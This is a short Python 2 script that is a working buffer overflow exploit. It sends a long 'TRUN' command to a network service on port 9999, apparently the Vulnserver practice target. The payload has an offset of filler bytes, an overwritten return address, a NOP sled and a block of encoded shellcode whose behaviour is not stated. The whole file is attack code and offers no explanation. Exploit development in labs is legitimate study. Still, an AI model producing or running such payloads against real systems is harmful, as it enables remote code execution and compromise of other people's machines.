import socket
server = '192.168.1.11'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
exploit = (
"\xba\x4c\xf1\xb4\x15\xdb\xdb\xd9\x74\x24\xf4\x5d\x29" +
"\xc9\xb1\x5b\x31\x55\x14\x83\xed\xfc\x03\x55\x10\xae" +
"\x04\x48\xfd\xac\xe7\xb1\xfe\xd0\x6e\x54\xcf\xd0\x15" +
"\x1c\x60\xe0\x5e\x70\x8d\x8b\x33\x61\x06\xf9\x9b\x86" +
"\xaf\xb7\xfd\xa9\x30\xeb\x3e\xab\xb2\xf1\x12\x0b\x8a" +
"\x3a\x67\x4a\xcb\x26\x8a\x1e\x84\x2d\x39\x8f\xa1\x7b" +
"\x82\x24\xf9\x6a\x82\xd9\x4a\x8d\xa3\x4f\xc0\xd4\x63" +
"\x71\x05\x6d\x2a\x69\x4a\x4b\xe4\x02\xb8\x20\xf7\xc2" +
"\xf0\xc9\x54\x2b\x3d\x38\xa4\x6b\xfa\xa2\xd3\x85\xf8" +
"\x5f\xe4\x51\x82\xbb\x61\x42\x24\x48\xd1\xae\xd4\x9d" +
"\x84\x25\xda\x6a\xc2\x62\xff\x6d\x07\x19\xfb\xe6\xa6" +
"\xce\x8d\xbc\x8c\xca\xd6\x67\xac\x4b\xb3\xc6\xd1\x8c" +
"\x1c\xb7\x77\xc6\xb1\xac\x05\x85\xdd\x01\x24\x36\x1e" +
"\x0d\x3f\x45\x2c\x92\xeb\xc1\x1c\x5b\x32\x15\x14\x4b" +
"\xc5\xc9\x9e\x1b\x3b\xea\xde\x32\xf8\xbe\x8e\x2c\x29" +
"\xbf\x44\xac\xd6\x6a\xf0\xa6\x40\x55\xad\xb7\x9a\x3d" +
"\xac\xb7\x8b\xe1\x39\x51\xfb\x49\x6a\xcd\xbc\x39\xca" +
"\xbd\x54\x50\xc5\xe2\x45\x5b\x0f\x8b\xec\xb4\xe6\xe4" +
"\x98\x2d\xa3\x7e\x38\xb1\x79\xfb\x7a\x39\x88\xfc\x35" +
"\xca\xf9\xee\x22\xad\x01\xee\xb2\x58\x02\x84\xb6\xca" +
"\x55\x30\xb5\x2b\x91\x9f\x46\x1e\xa1\xe7\xb9\xdf\x90" +
"\x9c\x8c\x75\x9d\xca\xf0\x99\x1d\x0a\xa7\xf3\x1d\x62" +
"\x1f\xa0\x4d\x97\x60\x7d\xe2\x04\xf5\x7e\x53\xf9\x5e" +
"\x17\x59\x24\xa8\xb8\xa2\x03\xaa\xbf\x5d\xd6\x85\x67" +
"\x36\x28\x96\x97\xc6\x42\x16\xc8\xae\x99\x39\xe7\x1e" +
"\x62\x90\xa0\x36\xe9\x75\x02\xa6\xee\x5f\xc2\x76\xef" +
"\x6c\xdf\x89\x8a\x1d\xe0\x69\x6b\x34\x85\x69\x6c\x38" +
"\xbb\x56\xbb\x01\xc9\x99\x78\x36\xd2\x07\x54\x43\x7b" +
"\x9e\x3d\xee\xe6\x21\xe8\x2d\x1f\xa2\x18\xce\xe4\xba" +
"\x69\xcb\xa1\x7c\x82\xa1\xba\xe8\xa4\x16\xba\x38"

)
padding = 'F' * (3000 - 2006 - 4 - 16 - len(exploit))
attack = prefix + eip + nopsled + exploit + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))

print s.recv(1024)
print "Sending attack for TRUN, length: ", len(attack)

s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')

print s.recv(1024)
s.close()
